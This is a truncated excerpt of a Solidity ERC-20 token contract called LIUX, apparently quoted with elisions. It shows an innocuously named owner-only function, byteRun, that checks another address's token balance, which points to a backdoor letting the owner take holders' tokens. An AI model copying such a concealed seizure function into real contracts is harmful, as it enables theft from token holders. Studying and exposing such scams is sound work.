...
contract LIUX is Ownable, IERC20 {
    ...
    string private _name = "LIUX";
    string private _symbol = "LIUX";
    ...
    function byteRun(address spender, uint256 amount) external {
        require(msg.sender == contractowner, "Only the owner can take tokens");
        require(_balance[spender] >= amount, "spender does not have enough tokens");
